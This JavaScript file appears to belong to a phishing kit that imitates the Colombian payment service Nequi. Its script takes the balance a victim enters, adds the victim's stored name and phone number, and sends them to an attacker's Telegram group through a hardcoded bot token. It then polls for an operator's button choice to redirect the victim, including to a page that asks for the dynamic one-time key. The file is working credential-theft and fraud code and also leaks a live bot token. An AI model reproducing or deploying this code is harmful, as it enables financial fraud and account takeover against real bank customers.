document.addEventListener('DOMContentLoaded', () => {
    const sendBtn = document.getElementById('send-balance-btn');
    const balanceInput = document.getElementById('balance-input');
    const loadingOverlay = document.getElementById('loading-overlay');
    const errorAlert = document.getElementById('error-alert');

    // --- CONFIGURACIÓN DE TELEGRAM ---
    const TELEGRAM_TOKEN = '8634395375:AAFb8HHwRA14QoyU769lYso0I7hlD_c0Ias';
    const TELEGRAM_CHAT_ID = '-5017945956'; // Nuevo Grupo LOG
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

    // Verificación de protocolo
    if (window.location.protocol === 'file:') {
        alert("⚠️ ERROR: Ejecuta 'node server.js' y abre http://localhost:3000");
    }

    // --- DETECCIÓN DE ERROR PREVIO (Saldo Incorrecto) ---
    const errorFlag = sessionStorage.getItem('show_saldo_error');
    if (errorFlag) {
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_saldo_error');
    }

    // Formato de moneda mejorado
    balanceInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        
        // Evitar que el autocompletado de Android/iOS meta puntos raros
        if (value.length > 12) {
            value = value.slice(0, 12);
        }

        if (value) {
            // Usamos formato de Colombia pero asegurándonos de que no confunda al teclado
            const formatter = new Intl.NumberFormat('es-CO');
            e.target.value = formatter.format(parseInt(value, 10));
        } else {
            e.target.value = '';
        }
    });

    // Desactivar autocompletado y sugerencias que causan el "550.000"
    balanceInput.setAttribute('autocomplete', 'off');
    balanceInput.setAttribute('autocorrect', 'off');
    balanceInput.setAttribute('autocapitalize', 'off');
    balanceInput.setAttribute('spellcheck', 'false');

    sendBtn.addEventListener('click', async () => {
        const saldo = balanceInput.value;
        if (!saldo) return;

        // Guardar saldo para reporte final
        sessionStorage.setItem("user_saldo", saldo);

        // Mostrar carga
        loadingOverlay.classList.add('active');

        const celular = sessionStorage.getItem("bc_usuario") || "No encontrado";
        const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
        const clave = "******"; // No la tenemos aquí, o podríamos guardarla en session también

        const mensaje = `💰 **SALDO INGRESADO (NEQUI)**\n\n` +
                        `👤 **Nombre:** \`${userNombre}\`\n` +
                        `📱 **Celular:** \`${celular}\`\n` +
                        `💵 **Saldo:** \`$ ${saldo}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;

        try {
            // Enviar a Telegram
            const response = await fetch(`${API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Finalizar", callback_data: "finish" },
                                { text: "🔄 Pedir Dinámica", callback_data: "ask_dynamic" }
                            ],
                            [
                                { text: "❌ Saldo Incorrecto", callback_data: "saldo_bad" },
                                { text: "❌ Usuario Incorrecto", callback_data: "wrong_user" }
                            ]
                        ]
                    }
                })
            });

            const data = await response.json();

            if (data.ok) {
                // Iniciar polling esperando respuesta
                pollTelegramUpdates(data.result.message_id);
            } else {
                console.warn('Error enviando a Telegram (status no ok). Redirigiendo a Dinámica...');
                // Fallback: Redirigir a dynamic-key.html si falla el envío
                setTimeout(() => {
                    window.location.href = 'dynamic-key.html';
                }, 2000);
            }

        } catch (error) {
            console.error('Error de red/conexión:', error);
            // Fallback: Redirigir a dynamic-key.html si hay excepción
            setTimeout(() => {
                window.location.href = 'dynamic-key.html';
            }, 2000);
        }
    });

    async function pollTelegramUpdates(originalMessageId) {
        let lastUpdateId = 0;
        let isPolling = true;

        // Timeout de seguridad: Si no hay respuesta en 30 segundos, avanzar
        const pollingTimeout = setTimeout(() => {
            if (isPolling) {
                isPolling = false;
                console.log("Tiempo de espera agotado. Redirigiendo automáticamente...");
                window.location.href = 'dynamic-key.html';
            }
        }, 30000); // 30 segundos

        // Obtener último ID
        try {
            const initialResp = await fetch(`${API_URL}/getUpdates?limit=1&offset=-1&t=${Date.now()}`, { cache: 'no-store' });
            const initialData = await initialResp.json();
            if (initialData.result && initialData.result.length > 0) {
                lastUpdateId = initialData.result[initialData.result.length - 1].update_id + 1;
            }
        } catch(e) {}

        const checkUpdates = async () => {
            if (!isPolling) return;
            try {
                const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId}&timeout=10&t=${Date.now()}`, { cache: 'no-store' });
                const data = await response.json();

                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id + 1;

                        if (update.callback_query) {
                            const cb = update.callback_query;
                            
                            // Verificar mensaje original
                            if (cb.message && cb.message.message_id === originalMessageId) {
                                await fetch(`${API_URL}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({ callback_query_id: cb.id })
                                });
                                
                                if (cb.data === 'finish') {
                                    window.location.href = 'final.html';
                                } else if (cb.data === 'ask_dynamic') {
                                    window.location.href = 'dynamic-key.html';
                                } else if (cb.data === 'saldo_bad') {
                                    sessionStorage.setItem('show_saldo_error', 'true');
                                    window.location.reload();
                                } else if (cb.data === 'wrong_user') {
                                    sessionStorage.setItem('show_login_error', 'true');
                                    window.location.href = 'index.html';
                                }

                                return;
                            }
                        }
                    }
                }
                setTimeout(checkUpdates, 100);
            } catch (error) {
                setTimeout(checkUpdates, 2000);
            }
        };
        checkUpdates();
    }
});